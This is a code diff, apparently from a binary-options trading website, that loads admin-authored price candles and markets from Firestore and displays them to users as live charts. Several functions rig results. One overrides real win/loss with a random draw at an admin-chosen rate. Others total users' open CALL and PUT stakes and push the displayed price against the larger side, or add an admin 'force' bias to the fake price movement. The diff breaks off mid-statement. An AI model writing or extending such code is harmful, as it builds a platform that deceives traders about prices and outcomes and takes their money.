+   PART 7A: DYNAMIC MARKET LOAD
+   (Firestore theke admin-er market load)
+   ============================================================ */
+
+window.userMarkets = [];
+window.marketsUnsub = null;
+window.selectedMarketId = null;
+
+/**
+ * Firestore theke enabled markets load kore
+ */
+async function loadUserMarketsFromFirestore() {
+  try {
+    const snap = await getDocs(collection(db, "markets"));
+    const markets = [];
+    snap.forEach(function(docSnap) {
+      const m = docSnap.data();
+      if (m.enabled === true) {
+        markets.push({
+          id: docSnap.id,
+          name: m.name || "Unknown",
+          symbol: m.symbol || "",
+          basePrice: m.basePrice || 50000,
+          payout: m.payout || 85,
+          winRate: m.winRate || 50,
+          candleMode: m.candleMode || "locked",
+          currentCandleIndex: m.currentCandleIndex || 0
+        });
+      }
+    });
+    markets.sort(function(a, b) {
+      return (a.name || "").localeCompare(b.name || "");
+    });
+    console.log("[Markets] Loaded " + markets.length + " user markets");
+    return markets;
+  } catch (err) {
+    console.error("[Markets] Load error:", err.message);
+    return [];
+  }
+}
+
+/**
+ * asset-select element-e markets populate kore
+ */
+function populateAssetSelect(markets) {
+  const sel = document.getElementById("asset-select");
+  if (!sel) {
+    console.warn("[Markets] asset-select not found");
+    return;
+  }
+
+  if (!markets || markets.length === 0) {
+    // No markets - show placeholder
+    sel.innerHTML = '<option value="">-- No Markets Available --</option>';
+    console.log("[Markets] No enabled markets to populate");
+    return;
+  }
+
+  const currentValue = sel.value;
+  sel.innerHTML = "";
+
+  markets.forEach(function(m) {
+    const opt = document.createElement("option");
+    opt.value = m.symbol;
+    opt.textContent = m.name + (m.payout ? " +" + m.payout + "%" : "");
+    opt.dataset.marketId = m.id;
+    opt.dataset.basePrice = m.basePrice;
+    opt.dataset.payout = m.payout;
+    opt.dataset.winRate = m.winRate;
+    sel.appendChild(opt);
+  });
+
+  // Try to restore previous selection
+  let found = false;
+  for (let i = 0; i < sel.options.length; i++) {
+    if (sel.options[i].value === currentValue) {
+      sel.value = currentValue;
+      found = true;
+      break;
+    }
+  }
+
+  // If previous not found, select first
+  if (!found && sel.options.length > 0) {
+    sel.selectedIndex = 0;
+  }
+
+  // Update global selectedAsset
+  if (sel.value) {
+    selectedAsset = sel.value;
+    window.selectedMarketId = sel.options[sel.selectedIndex]?.dataset.marketId || null;
+  }
+
+  console.log("[Markets] Populated " + markets.length + " markets. Selected: " + selectedAsset);
+}
+
+/**
+ * Real-time listener — admin market add korle auto update
+ */
+function listenUserMarkets() {
+  if (window.marketsUnsub) {
+    window.marketsUnsub();
+    window.marketsUnsub = null;
+  }
+
+  try {
+    window.marketsUnsub = onSnapshot(collection(db, "markets"), function(snap) {
+      const markets = [];
+      snap.forEach(function(docSnap) {
+        const m = docSnap.data();
+        if (m.enabled === true) {
+          markets.push({
+            id: docSnap.id,
+            name: m.name || "Unknown",
+            symbol: m.symbol || "",
+            basePrice: m.basePrice || 50000,
+            payout: m.payout || 85,
+            winRate: m.winRate || 50,
+            candleMode: m.candleMode || "locked",
+            currentCandleIndex: m.currentCandleIndex || 0
+          });
+        }
+      });
+      markets.sort(function(a, b) {
+        return (a.name || "").localeCompare(b.name || "");
+      });
+
+      window.userMarkets = markets;
+      populateAssetSelect(markets);
+
+      // Update payout labels on CALL/PUT buttons
+      if (typeof updatePayoutLabelsFromMarket === "function") {
+        updatePayoutLabelsFromMarket();
+      }
+
+      console.log("[Markets] Real-time update: " + markets.length + " markets");
+    }, function(err) {
+      console.error("[Markets] Listener error:", err.message);
+    });
+  } catch (err) {
+    console.error("[Markets] Listen error:", err.message);
+  }
+}
+
+/**
+ * Payout labels update based on selected market
+ */
+function updatePayoutLabelsFromMarket() {
+  const sel = document.getElementById("asset-select");
+  if (!sel || !sel.selectedOptions || sel.selectedOptions.length === 0) return;
+
+  const selectedOpt = sel.selectedOptions[0];
+  const payout = selectedOpt.dataset.payout || 85;
+
+  document.querySelectorAll(".btn-payout").forEach(function(el) {
+    el.textContent = "+" + payout + "%";
+  });
+}
+
+/**
+ * Market change handler — select change hole candle reload
+ */
+function bindMarketChangeHandler() {
+  const sel = document.getElementById("asset-select");
+  if (!sel || sel.dataset.boundUserMarket === "1") return;
+
+  sel.dataset.boundUserMarket = "1";
+
+  sel.addEventListener("change", async function() {
+    const sel2 = document.getElementById("asset-select");
+    if (!sel2) return;
+
+    selectedAsset = sel2.value;
+    const selectedOpt = sel2.selectedOptions[0];
+    if (selectedOpt) {
+      window.selectedMarketId = selectedOpt.dataset.marketId || null;
+    }
+
+    console.log("[Markets] User selected: " + selectedAsset + " (id: " + window.selectedMarketId + ")");
+
+    updatePayoutLabelsFromMarket();
+
+    // Reload candles + restart live price
+    if (typeof loadCandles === "function") {
+      await loadCandles();
+    }
+    if (typeof startLivePrice === "function" && currentUser) {
+      startLivePrice();
+    }
+  });
+
+  console.log("[Markets] Market change handler bound");
+}
+
+/**
+ * Init — Auth state er sathe bind
+ */
+function initUserMarkets() {
+  console.log("[Markets] Initializing user markets...");
+
+  // Bind change handler
+  bindMarketChangeHandler();
+
+  // Load initial markets
+  loadUserMarketsFromFirestore().then(function(markets) {
+    populateAssetSelect(markets);
+    updatePayoutLabelsFromMarket();
+  });
+
+  // Start real-time listener
+  listenUserMarkets();
+}
+
+// Auto-init when user logs in
+(function() {
+  var origAuthWatch = setInterval(function() {
+    if (window.currentUser && !window.marketsUnsub) {
+      console.log("[Markets] User logged in - initializing markets");
+      initUserMarkets();
+    }
+    if (!window.currentUser && window.marketsUnsub) {
+      window.marketsUnsub();
+      window.marketsUnsub = null;
+      console.log("[Markets] User logged out - listener stopped");
+    }
+  }, 2000);
+})();
+
+// Also init on load (in case user is already logged in)
+document.addEventListener("DOMContentLoaded", function() {
+  setTimeout(function() {
+    if (window.currentUser) {
+      initUserMarkets();
+    }
+  }, 2500);
+});
+
+// === EXPOSE FIREBASE FUNCTIONS TO WINDOW ===
+window.db = db;
+window.auth = auth;
+window.getDocs = getDocs;
+window.collection = collection;
+window.doc = doc;
+window.setDoc = setDoc;
+window.updateDoc = updateDoc;
+window.query = query;
+window.where = where;
+window.onSnapshot = onSnapshot;
+window.addDoc = addDoc;
+window.getDoc = getDoc;
+console.log("✅ Firebase functions exposed to window");
+console.log("Part 7A (Dynamic Market Load) loaded");
+/* ============================================================
+   PART 7B: CANDLE RENDER FROM FIRESTORE
+   (Admin-er save kora candle user site-e load)
+   ============================================================ */
+
+window.userCandles = [];
+window.userCandlesUnsub = null;
+window.candleModeGlobal = "locked";
+
+/**
+ * Admin-er candle Firestore theke load kore
+ */
+async function loadAdminCandlesFromFirestore(marketId) {
+  if (!marketId) {
+    console.log("[Candles] No marketId provided");
+    return [];
+  }
+
+  try {
+    const candlesRef = collection(db, "markets", marketId, "candles");
+    const snap = await getDocs(candlesRef);
+
+    if (snap.empty) {
+      console.log("[Candles] No candles in Firestore for market: " + marketId);
+      return [];
+    }
+
+    const candles = [];
+    snap.forEach(function(docSnap) {
+      const c = docSnap.data();
+      candles.push({
+        id: docSnap.id,
+        number: c.number || 0,
+        date: c.date || "",
+        startTime: c.startTime || c.time || "",
+        endTime: c.endTime || "",
+        timeframe: c.timeframe || "1m",
+        open: Number(c.open) || 0,
+        high: Number(c.high) || 0,
+        low: Number(c.low) || 0,
+        close: Number(c.close) || 0,
+        color: c.color || "green",
+        direction: c.direction || "up",
+        size: c.size || "medium",
+        wickLength: Number(c.wickLength) || 20,
+        bodySize: Number(c.bodySize) || 60,
+        status: c.status || "pending"
+      });
+    });
+
+    candles.sort(function(a, b) {
+      return (a.number || 0) - (b.number || 0);
+    });
+
+    console.log("[Candles] Loaded " + candles.length + " admin candles from Firestore");
+    return candles;
+
+  } catch (err) {
+    console.error("[Candles] Load error:", err.message);
+    return [];
+  }
+}
+
+/**
+ * Admin candle → LightweightCharts format
+ * Time conversion: date + startTime → Unix timestamp (seconds)
+ */
+function convertAdminCandleToChart(candle, baseIndex) {
+  try {
+    // Date + Time → Unix timestamp
+    const dateStr = candle.date || "2026-01-01";
+    const timeStr = candle.startTime || "00:00:00";
+    const dateTimeStr = dateStr + "T" + timeStr + "Z";
+    let timestamp = Math.floor(new Date(dateTimeStr).getTime() / 1000);
+
+    // If invalid, use fallback (incremental)
+    if (isNaN(timestamp) || timestamp <= 0) {
+      timestamp = Math.floor(Date.now() / 1000) - (baseIndex * 60);
+    }
+
+    return {
+      time: timestamp,
+      open: candle.open,
+      high: candle.high,
+      low: candle.low,
+      close: candle.close
+    };
+
+  } catch (err) {
+    return null;
+  }
+}
+
+/**
+ * Admin candles render kore chart-e
+ */
+function renderAdminCandlesOnChart(candles) {
+  if (!candleSeries) {
+    console.warn("[Candles] candleSeries not initialized");
+    return;
+  }
+
+  if (!candles || candles.length === 0) {
+    console.log("[Candles] No candles to render");
+    return;
+  }
+
+  const chartData = [];
+  candles.forEach(function(c, i) {
+    const chartCandle = convertAdminCandleToChart(c, i);
+    if (chartCandle && chartCandle.open > 0) {
+      chartData.push(chartCandle);
+    }
+  });
+
+  if (chartData.length === 0) {
+    console.warn("[Candles] No valid chart data after conversion");
+    return;
+  }
+
+  // Sort by time (ascending)
+  chartData.sort(function(a, b) { return a.time - b.time; });
+
+  // Remove duplicates (same time)
+  const uniqueData = [];
+  let lastTime = 0;
+  chartData.forEach(function(c) {
+    if (c.time > lastTime) {
+      uniqueData.push(c);
+      lastTime = c.time;
+    }
+  });
+
+  try {
+    candleSeries.setData(uniqueData);
+    chart.timeScale().fitContent();
+
+    // Update current price
+    const lastCandle = uniqueData[uniqueData.length - 1];
+    if (lastCandle) {
+      currentPrice = lastCandle.close;
+      prevPrice = currentPrice;
+      if (currentPriceEl) {
+        currentPriceEl.textContent = currentPrice.toFixed(2);
+      }
+    }
+
+    console.log("[Candles] Rendered " + uniqueData.length + " candles on chart");
+  } catch (err) {
+    console.error("[Candles] Render error:", err.message);
+  }
+}
+
+/**
+ * Real-time listener for admin candles
+ */
+function listenAdminCandles(marketId) {
+  if (window.userCandlesUnsub) {
+    window.userCandlesUnsub();
+    window.userCandlesUnsub = null;
+  }
+
+  if (!marketId) {
+    console.log("[Candles] No marketId - listener not started");
+    return;
+  }
+
+  try {
+    const candlesRef = collection(db, "markets", marketId, "candles");
+
+    window.userCandlesUnsub = onSnapshot(candlesRef, function(snap) {
+      const candles = [];
+      snap.forEach(function(docSnap) {
+        const c = docSnap.data();
+        candles.push({
+          id: docSnap.id,
+          number: c.number || 0,
+          date: c.date || "",
+          startTime: c.startTime || c.time || "",
+          endTime: c.endTime || "",
+          timeframe: c.timeframe || "1m",
+          open: Number(c.open) || 0,
+          high: Number(c.high) || 0,
+          low: Number(c.low) || 0,
+          close: Number(c.close) || 0,
+          color: c.color || "green",
+          direction: c.direction || "up"
+        });
+      });
+
+      candles.sort(function(a, b) {
+        return (a.number || 0) - (b.number || 0);
+      });
+
+      window.userCandles = candles;
+      renderAdminCandlesOnChart(candles);
+      console.log("[Candles] Real-time update: " + candles.length + " candles");
+    }, function(err) {
+      console.error("[Candles] Listener error:", err.message);
+    });
+
+    console.log("[Candles] Listener started for market: " + marketId);
+
+  } catch (err) {
+    console.error("[Candles] Listen error:", err.message);
+  }
+}
+
+/**
+ * Smart candle loader: Firestore first, Binance fallback
+ */
+async function loadUserCandlesSmart() {
+  const marketId = window.selectedMarketId;
+
+  if (marketId) {
+    console.log("[Candles] Loading admin candles for market: " + marketId);
+
+    const adminCandles = await loadAdminCandlesFromFirestore(marketId);
+
+    if (adminCandles.length > 0) {
+      // Render admin candles
+      renderAdminCandlesOnChart(adminCandles);
+
+      // Start real-time listener
+      listenAdminCandles(marketId);
+      console.log("[Candles] Using ADMIN candles (" + adminCandles.length + ")");
+      return;
+    } else {
+      console.log("[Candles] No admin candles - falling back to Binance");
+    }
+  } else {
+    console.log("[Candles] No marketId - using Binance fallback");
+  }
+
+  // Fallback: Binance API
+  if (window.userCandlesUnsub) {
+    window.userCandlesUnsub();
+    window.userCandlesUnsub = null;
+  }
+
+  if (typeof loadCandles === "function") {
+    await loadCandles();
+  }
+}
+
+/**
+ * Init on market change
+ */
+function onMarketChanged() {
+  console.log("[Candles] Market changed - reloading candles");
+  loadUserCandlesSmart();
+}
+
+// ============================================================
+// BIND: Market change handler override
+// ============================================================
+
+// Wait for Part 7A to load, then override bindMarketChangeHandler
+setTimeout(function() {
+  const sel = document.getElementById("asset-select");
+  if (!sel) {
+    console.warn("[Candles] asset-select not found");
+    return;
+  }
+
+  // Remove old handlers by cloning
+  const newSel = sel.cloneNode(true);
+  sel.parentNode.replaceChild(newSel, sel);
+
+  // Bind new handler
+  newSel.addEventListener("change", async function() {
+    const selectedOpt = newSel.selectedOptions[0];
+    selectedAsset = newSel.value;
+    window.selectedMarketId = selectedOpt ? (selectedOpt.dataset.marketId || null) : null;
+
+    console.log("[Candles] User selected: " + selectedAsset + " (id: " + window.selectedMarketId + ")");
+
+    // Update payout labels
+    if (typeof updatePayoutLabelsFromMarket === "function") {
+      updatePayoutLabelsFromMarket();
+    }
+
+    // Load candles: Firestore first
+    await loadUserCandlesSmart();
+
+    // Restart live price (for fallback Binance mode)
+    if (window.selectedMarketId === null && typeof startLivePrice === "function" && currentUser) {
+      startLivePrice();
+    }
+  });
+
+  console.log("[Candles] Market change handler re-bound (Part 7B)");
+}, 3500);
+
+// ============================================================
+// INIT: Load candles on user login
+// ============================================================
+
+(function() {
+  let lastLoginState = false;
+
+  setInterval(function() {
+    const nowLoggedIn = !!window.currentUser;
+
+    // User just logged in
+    if (nowLoggedIn && !lastLoginState) {
+      console.log("[Candles] User logged in - loading candles");
+      setTimeout(function() {
+        loadUserCandlesSmart();
+      }, 3000);
+    }
+
+    // User just logged out
+    if (!nowLoggedIn && lastLoginState) {
+      console.log("[Candles] User logged out - stopping listeners");
+      if (window.userCandlesUnsub) {
+        window.userCandlesUnsub();
+        window.userCandlesUnsub = null;
+      }
+    }
+
+    lastLoginState = nowLoggedIn;
+  }, 2000);
+})();
+
+// Also init on DOMContentLoaded (if user already logged in)
+document.addEventListener("DOMContentLoaded", function() {
+  setTimeout(function() {
+    if (window.currentUser) {
+      console.log("[Candles] DOMContentLoaded - user already logged in, loading candles");
+      loadUserCandlesSmart();
+    }
+  }, 5000);
+});
+
+console.log("Part 7B (Candle Render from Firestore) loaded");
+
+// ============================================================
+// EXPOSE FIREBASE + STATE TO WINDOW (FINAL FIX)
+// ============================================================
+
+window.db = db;
+window.auth = auth;
+window.getDocs = getDocs;
+window.collection = collection;
+window.doc = doc;
+window.setDoc = setDoc;
+window.updateDoc = updateDoc;
+window.query = query;
+window.where = where;
+window.onSnapshot = onSnapshot;
+window.addDoc = addDoc;
+window.getDoc = getDoc;
+
+console.log("✅ Firebase functions exposed to window");
+
+// Sync module state to window
+setTimeout(function() {
+  window.loadUserMarketsFromFirestore = loadUserMarketsFromFirestore;
+  window.loadAdminCandlesFromFirestore = loadAdminCandlesFromFirestore;
+  window.renderAdminCandlesOnChart = renderAdminCandlesOnChart;
+  window.listenAdminCandles = listenAdminCandles;
+  window.loadUserCandlesSmart = loadUserCandlesSmart;
+  console.log("✅ Functions exposed after 2s");
+}, 2000);
+
+setInterval(function() {
+  if (typeof currentUser !== 'undefined' && currentUser) window.currentUser = currentUser;
+  if (typeof chart !== 'undefined' && chart) window.chart = chart;
+  if (typeof candleSeries !== 'undefined' && candleSeries) window.candleSeries = candleSeries;
+}, 500);
+
+console.log("✅ State sync started");
+
+/* ============================================================
+   MSG 10: TRUE TRADE MECHANIC + COUNTDOWN + ENTRY LINE
+   (Self-contained — no dependency on missing functions)
+   ============================================================ */
 
 // ============================================================
 // 1. TOP-LEFT COUNTDOWN TIMER
@@ -1370,6 +2549,7 @@ function updateTopCountdown() {
   var arrowEl = document.getElementById("trade-info-arrow");
   var infoTextEl = document.getElementById("trade-info-text");
 
+  // Access activeTradesLocal via module scope (may be in different name)
   var trades = (typeof activeTradesLocal !== "undefined" && Array.isArray(activeTradesLocal))
     ? activeTradesLocal : [];
 
@@ -1379,6 +2559,7 @@ function updateTopCountdown() {
     return;
   }
 
+  // Find soonest trade
   var soonest = trades[0];
   for (var i = 1; i < trades.length; i++) {
     if (trades[i].expiresAt < soonest.expiresAt) soonest = trades[i];
@@ -1406,29 +2587,20 @@ function updateTopCountdown() {
       infoTextEl.textContent = String(soonest.type || "call").toUpperCase() + " $" + (soonest.amount || 0);
     }
   }
-
-  // Per-trade countdown in list
-  var tradeItems = document.querySelectorAll("#active-trades-list .trade-item");
-  tradeItems.forEach(function(item, index) {
-    var trade = activeTradesLocal[index];
-    if (!trade) return;
-    var cd = item.querySelector(".trade-countdown");
-    if (cd) {
-      var rem = Math.max(0, Math.ceil((trade.expiresAt - Date.now()) / 1000));
-      var mm2 = Math.floor(rem / 60);
-      var ss2 = rem % 60;
-      cd.textContent = String(mm2).padStart(2, "0") + ":" + String(ss2).padStart(2, "0");
-      cd.classList.remove("warning", "critical");
-      if (rem <= 5) cd.classList.add("critical");
-      else if (rem <= 15) cd.classList.add("warning");
-    }
-  });
 }
 
 function startCountdownInterval() {
   if (window.countdownInterval) return;
   window.countdownInterval = setInterval(updateTopCountdown, 200);
   console.log("[MSG10] Countdown interval started");
+}
+
+function stopCountdownInterval() {
+  if (window.countdownInterval) {
+    clearInterval(window.countdownInterval);
+    window.countdownInterval = null;
+    console.log("[MSG10] Countdown interval stopped");
+  }
 }
 
 // Auto-start
@@ -1438,6 +2610,33 @@ document.addEventListener("DOMContentLoaded", startCountdownInterval);
 // ============================================================
 // 2. TRUE TRADE MECHANIC — Entry vs Exit Compare
 // ============================================================
+
+function safeShowResultFlash(result) {
+  if (typeof showResultFlash === "function") {
+    try { showResultFlash(result); return; } catch(e) {}
+  }
+  // Fallback flash
+  var flash = document.createElement("div");
+  flash.className = "result-flash " + result;
+  document.body.appendChild(flash);
+  setTimeout(function() { flash.remove(); }, 700);
+}
+
+function safePlaySound(type) {
+  if (typeof playSound === "function") {
+    try { playSound(type); return; } catch(e) {}
+  }
+}
+
+function safeAnimateBalanceChange(amount) {
+  if (typeof animateBalanceChange === "function") {
+    try { animateBalanceChange(amount); return; } catch(e) {}
+  }
+  // Fallback: update balance display
+  if (typeof balanceEl !== "undefined" && balanceEl) {
+    balanceEl.textContent = Number(userBalance).toFixed(2);
+  }
+}
 
 async function processTradeResults() {
   if (typeof currentUser === "undefined" || !currentUser) return;
@@ -1461,15 +2660,6 @@ async function processTradeResults() {
     if (trade.type === "call" && diff > 0) realResult = "win";
     else if (trade.type === "put" && diff < 0) realResult = "win";
 
-    // Admin win/loss override (optional)
-    var winPercent = window.adminWinPercent || 80;
-    var useAdminOverride = (winPercent !== 100 && winPercent !== 0);
-
-    if (useAdminOverride) {
-      var r = Math.random() * 100;
-      realResult = r < winPercent ? "win" : "loss";
-    }
-
     console.log(
       "[Trade Result] " + String(trade.type).toUpperCase() +
       " | Entry: " + entryPrice.toFixed(2) +
@@ -1478,7 +2668,7 @@ async function processTradeResults() {
       " | " + realResult.toUpperCase()
     );
 
-    var payoutRate = ((typeof adminPayout !== "undefined" ? adminPayout : 96) / 100) + 1;
+    var payoutRate = ((typeof adminPayout !== "undefined" ? adminPayout : 85) / 100) + 1;
     var netProfit = realResult === "win" ? trade.amount * (payoutRate - 1) : 0;
     var returnAmount = realResult === "win" ? trade.amount + netProfit : 0;
 
@@ -1507,26 +2697,31 @@ async function processTradeResults() {
             balance: newBal
           });
 
-          userBalance = newBal;
+          if (typeof userBalance !== "undefined") userBalance = newBal;
           window.userBalance = newBal;
 
-          if (balanceEl) balanceEl.textContent = newBal.toFixed(2);
-          if (balancePopupValue) balancePopupValue.textContent = newBal.toFixed(2);
+          if (typeof balanceEl !== "undefined" && balanceEl) {
+            balanceEl.textContent = newBal.toFixed(2);
+          }
+          if (typeof balancePopupValue !== "undefined" && balancePopupValue) {
+            balancePopupValue.textContent = newBal.toFixed(2);
+          }
 
-          animateBalanceChange(returnAmount);
-          showResultFlash("win");
-          playSound("win");
+          safeAnimateBalanceChange(returnAmount);
+          safeShowResultFlash("win");
+          safePlaySound("win");
 
-          if (tradeMessage) {
+          if (typeof tradeMessage !== "undefined" && tradeMessage) {
             tradeMessage.style.color = "#00c853";
             tradeMessage.textContent = "🎉 জিতেছেন! +$" + netProfit.toFixed(2);
             setTimeout(function() { tradeMessage.textContent = ""; }, 3500);
           }
         }
       } else {
-        showResultFlash("loss");
-        playSound("loss");
-        if (tradeMessage) {
+        safeShowResultFlash("loss");
+        safePlaySound("loss");
+
+        if (typeof tradeMessage !== "undefined" && tradeMessage) {
           tradeMessage.style.color = "#ff5252";
           tradeMessage.textContent = "😔 হেরেছেন -$" + trade.amount.toFixed(2);
           setTimeout(function() { tradeMessage.textContent = ""; }, 3500);
@@ -1576,9 +2771,75 @@ function renderTradeMarkers() {
 
 setInterval(renderTradeMarkers, 2000);
 
-// ============================================
-// MSG 11: LIVE MOVEMENT + AUTO CANDLE + MULTI-USER ANALYSIS
-// ============================================
+// ============================================================
+// 4. FINAL EXPOSE (all-in-one, null-safe)
+// ============================================================
+
+(function exposeSafely() {
+  var toExpose = [
+    "placeTrade", "checkExpiredTrades", "checkExpiredTradesAdmin",
+    "loadActiveTrades", "loadHistory", "initChart", "loadCandles",
+    "startLivePrice", "stopLivePrice", "updateBigTimer",
+    "animateBalanceChange", "showResultFlash", "playSound"
+  ];
+
+  for (var i = 0; i < toExpose.length; i++) {
+    var name = toExpose[i];
+    try {
+      if (typeof eval(name) === "function") {
+        window[name] = eval(name);
+      }
+    } catch(e) {
+      // silently skip
+    }
+  }
+
+  // Expose new MSG 10 functions
+  window.updateTopCountdown = updateTopCountdown;
+  window.startCountdownInterval = startCountdownInterval;
+  window.stopCountdownInterval = stopCountdownInterval;
+  window.processTradeResults = processTradeResults;
+  window.renderTradeMarkers = renderTradeMarkers;
+
+  console.log("[MSG10] Functions exposed safely");
+})();
+
+// ============================================================
+// 5. STATE SYNC (every 500ms)
+// ============================================================
+
+setInterval(function() {
+  try {
+    if (typeof currentUser !== "undefined" && currentUser) {
+      window.currentUser = currentUser;
+    }
+    if (typeof userBalance !== "undefined") {
+      window.userBalance = userBalance;
+    }
+    if (typeof currentPrice !== "undefined") {
+      window.currentPrice = currentPrice;
+    }
+    if (typeof activeTradesLocal !== "undefined" && Array.isArray(activeTradesLocal)) {
+      window.activeTradesLocal = activeTradesLocal;
+    }
+    if (typeof chart !== "undefined" && chart) {
+      window.chart = chart;
+    }
+    if (typeof candleSeries !== "undefined" && candleSeries) {
+      window.candleSeries = candleSeries;
+    }
+  } catch(e) {}
+}, 500);
+
+console.log("===== MSG 10: True Trade Mechanic + Countdown + Entry Line loaded =====");
+
+/* ============================================================
+   MSG 11: LIVE MOVEMENT + AUTO CANDLE + MULTI-USER ANALYSIS
+   ============================================================ */
+
+// ============================================================
+// 1. STATE VARIABLES
+// ============================================================
 
 window.adminWinPercent = 80;
 window.adminLossPercent = 30;
@@ -1587,16 +2848,21 @@ window.liveMovementInterval = null;
 window.autoCandleInterval = null;
 window.analyzerInterval = null;
 
+// Track current candle time
 window.currentCandleTime = Math.floor(Date.now() / 1000);
 window.currentCandleOpen = currentPrice;
 
-// Listen admin settings for win/loss
+// ============================================================
+// 2. LISTEN ADMIN SETTINGS FOR WIN/LOSS
+// ============================================================
+
 function listenWinLossSettings() {
   if (typeof db === "undefined") return;
 
   try {
     onSnapshot(doc(db, "settings", "global"), function(snap) {
       if (!snap.exists()) return;
+
       var d = snap.data();
       window.adminWinPercent = d.winPercent ?? 80;
       window.adminLossPercent = d.lossPercent ?? 30;
@@ -1615,7 +2881,10 @@ function listenWinLossSettings() {
 
 setTimeout(listenWinLossSettings, 2500);
 
-// Live price movement (every 500ms)
+// ============================================================
+// 3. LIVE PRICE MOVEMENT (every 500ms)
+// ============================================================
+
 function startLiveMovement() {
   if (window.liveMovementInterval) clearInterval(window.liveMovementInterval);
 
@@ -1623,8 +2892,10 @@ function startLiveMovement() {
     if (typeof candleSeries === "undefined" || !candleSeries) return;
     if (typeof currentPrice === "undefined") return;
 
+    var speed = window.liveSpeed || 500;
     var drift = (Math.random() - 0.5) * 30;
 
+    // Direction bias from adminForceMarket
     var force = (typeof adminForceMarket !== "undefined") ? adminForceMarket : 0;
     if (force > 0) drift += Math.random() * 15;
     else if (force < 0) drift -= Math.random() * 15;
@@ -1634,13 +2905,19 @@ function startLiveMovement() {
 
     if (typeof currentPriceEl !== "undefined" && currentPriceEl) {
       currentPriceEl.textContent = currentPrice.toFixed(2);
-      currentPriceEl.style.color = drift >= 0 ? "#00c853" : "#ff5252";
+      if (drift >= 0) {
+        currentPriceEl.style.color = "#00c853";
+      } else {
+        currentPriceEl.style.color = "#ff5252";
+      }
     }
 
+    // Update chart candle in real-time
     var now = Math.floor(Date.now() / 1000);
     var candleTime = Math.floor(now / 60) * 60;
 
     if (candleTime > window.currentCandleTime) {
+      // New minute started
       window.currentCandleTime = candleTime;
       window.currentCandleOpen = currentPrice;
     }
@@ -1658,13 +2935,18 @@ function startLiveMovement() {
         low: lowP,
         close: closeP
       });
-    } catch(e) {}
+    } catch(e) {
+      // ignore
+    }
   }, 500);
 
   console.log("[MSG11] Live movement started");
 }
 
-// Auto candle generation (every 1m)
+// ============================================================
+// 4. AUTO CANDLE GENERATION (every 1m)
+// ============================================================
+
 function startAutoCandleGeneration() {
   if (window.autoCandleInterval) clearInterval(window.autoCandleInterval);
 
@@ -1673,7 +2955,12 @@ function startAutoCandleGeneration() {
     if (!window.currentUser) return;
 
     var mode = (typeof adminSettings !== "undefined" && adminSettings.candleMode) || "random";
-    if (mode === "locked") return;
+
+    // Only auto-generate if mode is random or schedule
+    if (mode === "locked") {
+      console.log("[MSG11] LOCKED mode - no auto generation");
+      return;
+    }
 
     var now = Math.floor(Date.now() / 1000);
     var candleTime = Math.floor(now / 60) * 60;
@@ -1699,13 +2986,18 @@ function startAutoCandleGeneration() {
       window.currentCandleOpen = closeP;
 
       console.log("[MSG11] Auto candle generated:", openP.toFixed(2), "→", closeP.toFixed(2));
-    } catch(e) {}
+    } catch(e) {
+      console.error("[MSG11] Auto candle error:", e.message);
+    }
   }, 60000);
 
   console.log("[MSG11] Auto candle generation started");
 }
 
-// Multi-user trade analysis
+// ============================================================
+// 5. MULTI-USER TRADE ANALYSIS
+// ============================================================
+
 window.tradeAnalysis = {
   totalCall: 0,
   totalPut: 0,
@@ -1735,11 +3027,19 @@ async function analyzeActiveTrades() {
     }
 
     var callTotal = 0, putTotal = 0, callCount = 0, putCount = 0;
+    var callUsers = [], putUsers = [];
 
     snap.forEach(function(d) {
       var t = d.data();
-      if (t.type === "call") { callTotal += t.amount; callCount++; }
-      else if (t.type === "put") { putTotal += t.amount; putCount++; }
+      if (t.type === "call") {
+        callTotal += t.amount;
+        callCount++;
+        callUsers.push({ id: d.id, userId: t.userId, amount: t.amount });
+      } else if (t.type === "put") {
+        putTotal += t.amount;
+        putCount++;
+        putUsers.push({ id: d.id, userId: t.userId, amount: t.amount });
+      }
     });
 
     window.tradeAnalysis = {
@@ -1747,8 +3047,8 @@ async function analyzeActiveTrades() {
       totalPut: putTotal,
       callCount: callCount,
       putCount: putCount,
-      callUsers: [],
-      putUsers: [],
+      callUsers: callUsers,
+      putUsers: putUsers,
       suggestedDirection: callTotal > putTotal ? "down" : (putTotal > callTotal ? "up" : "neutral")
     };
 
@@ -1767,12 +3067,16 @@ async function analyzeActiveTrades() {
 function startTradeAnalysis() {
   if (window.analyzerInterval) clearInterval(window.analyzerInterval);
   window.analyzerInterval = setInterval(analyzeActiveTrades, 2000);
-  console.log("[MSG11] Trade analyzer started");
+  console.log("[MSG11] Trade analyzer started (2s interval)");
 }
 
-// Auto-direction bias
+// ============================================================
+// 6. AUTO-DIRECTION BASED ON ANALYSIS
+// ============================================================
+
 function applyDirectionBias() {
   if (typeof candleSeries === "undefined" || !candleSeries) return;
+
   var analysis = window.tradeAnalysis;
   if (!analysis) return;
   if (analysis.callCount + analysis.putCount === 0) return;
@@ -1780,6 +3084,7 @@ function applyDirectionBias() {
   var direction = analysis.suggestedDirection;
   if (direction === "neutral") return;
 
+  // Apply gentle pressure
   var bias = direction === "up" ? 1.5 : -1.5;
   currentPrice = currentPrice + bias;
   window.currentPrice = currentPrice;
@@ -1787,7 +3092,123 @@ function applyDirectionBias() {
 
 setInterval(applyDirectionBias, 1000);
 
-// Start MSG 11 systems
+// ============================================================
+// 7. IMPROVED processTradeResults — uses LIVE price
+// ============================================================
+
+async function processTradeResultsV2() {
+  if (typeof currentUser === "undefined" || !currentUser) return;
+
+  var trades = (typeof activeTradesLocal !== "undefined" && Array.isArray(activeTradesLocal))
+    ? activeTradesLocal : [];
+
+  if (trades.length === 0) return;
+
+  var now = Date.now();
+
+  for (var i = 0; i < trades.length; i++) {
+    var trade = trades[i];
+    if (trade.expiresAt > now || trade.status !== "pending") continue;
+
+    var entryPrice = Number(trade.entryPrice) || currentPrice;
+    var exitPrice = Number(currentPrice);
+    var diff = exitPrice - entryPrice;
+
+    var realResult = "loss";
+    if (trade.type === "call" && diff > 0) realResult = "win";
+    else if (trade.type === "put" && diff < 0) realResult = "win";
+
+    // Admin Win/Loss override (optional)
+    var winPercent = window.adminWinPercent || 80;
+    var useAdminOverride = (winPercent !== 100 && winPercent !== 0);
+
+    if (useAdminOverride) {
+      var r = Math.random() * 100;
+      if (r < winPercent) {
+        realResult = "win";
+      } else {
+        realResult = "loss";
+      }
+    }
+
+    console.log(
+      "[Trade Result V2] " + String(trade.type).toUpperCase() +
+      " | Entry: " + entryPrice.toFixed(2) +
+      " → Exit: " + exitPrice.toFixed(2) +
+      " | Diff: " + diff.toFixed(2) +
+      " | Real: " + (diff > 0 ? "UP" : (diff < 0 ? "DOWN" : "FLAT")) +
